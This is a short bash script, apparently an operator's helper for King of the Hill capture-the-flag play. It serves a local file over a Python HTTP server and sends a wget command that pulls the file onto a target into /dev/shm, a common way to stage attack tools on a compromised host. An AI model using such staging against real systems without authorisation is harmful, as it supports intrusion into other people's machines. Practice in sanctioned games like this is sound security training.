#!/bin/bash

source "/root/git/koth/scripts/functions.sh"

PORT=$(($RANDOM+3000))
filename=$(basename $1)
TMPDIR=$(mktemp -d)

hide_guake

cp $filename $TMPDIR

python3 -m http.server $PORT &
sleep 0.5

command "wget $IP:$PORT/$filename -O /dev/shm/$filename"
